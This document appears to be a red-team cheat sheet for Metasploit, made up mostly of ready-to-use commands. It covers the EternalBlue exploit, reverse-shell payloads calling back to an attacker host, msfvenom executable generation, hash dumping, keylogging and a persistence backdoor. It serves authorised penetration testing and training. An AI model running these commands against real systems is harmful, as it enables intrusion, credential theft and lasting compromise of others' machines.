# Metasploit Cheat Sheet (Red Team & Multi-Client Use)

---

## 🚀 Metasploit Basics

### Start Metasploit Console

```bash
msfconsole
```

---

### Search Modules

```bash
search <keyword>
search type:exploit name:windows
```

---

### Use a Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

### Set Options

```bash
set RHOSTS 10.0.0.5
set LHOST 10.0.0.2
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

### Exploit Target

```bash
exploit
# or
run
```

---

### Background a Session

```bash
background
```

---

### List Active Sessions

```bash
sessions -i
```

---

### Interact with a Session

```bash
sessions -i <ID>
```

---

## 📥 Payload Generation

### With msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe -o shell.exe
```

Formats:
- `exe`, `ps1`, `dll`, `asp`, `raw`, `c`, `elf`, `macho`, etc.

---

## 🛠 Post-Exploitation Commands

Inside a Meterpreter session:

```bash
getuid                     # Current user
sysinfo                   # OS info
ps                        # List processes
shell                     # Drop to system shell
hashdump                  # Dump hashes
migrate <pid>             # Migrate to another process
upload / download         # Move files
keyscan_start / dump      # Keystroke logging
```

---

## 🧠 Persistence & Priv Esc

### Windows Priv Esc Enumeration

```
use post/windows/gather/win_privs
run
```

### Persistence Module

```
use persistence
set LHOST <attacker>
set LPORT <port>
set EXE_NAME backdoor.exe
run
```

---

## 🧬 Multiple Clients / Team Workflow

### Session Naming (for clarity)

```bash
sessions -n 1 client_alpha_web01
sessions -n 2 client_beta_dc01
```

---

### Tags in Notes

```bash
notes -a -t creds -n "admin:password123" -r 1
```
(Adds creds note to session 1)

---

### Workspace per Client

```bash
workspace
workspace add acme_internal
workspace add internal_ops
workspace switch acme_internal
```

Each workspace stores:
- Hosts
- Services
- Loot
- Sessions

---

### Logging Everything

```bash
setg LogLevel 3
spool /path/to/logfile.log
```

---

## 📦 Database Integration

### Initialize PostgreSQL DB

```bash
msfdb init
```

### DB Commands

```
hosts
services
vulns
creds
```

---

## 💡 Tips for Red Teams

- Use **workspaces** for client separation
- Set `setg LHOST` globally for shared payload configs
- Background sessions and automate with `resource` scripts
- Export loot with `loot` and `creds` modules
- Integrate with Cobalt Strike or Covenant for hybrid operations

---

## 🧰 Helpful Modules

| Purpose         | Module Example                             |
|-----------------|---------------------------------------------|
| Exploit         | `exploit/windows/smb/ms17_010_eternalblue` |
| Post Exploit    | `post/windows/gather/enum_logged_on_users` |
| Credential Dump | `post/windows/gather/hashdump`             |
| Persistence     | `post/windows/manage/persistence`          |
| Info Gathering  | `auxiliary/scanner/smb/smb_version`        |

---


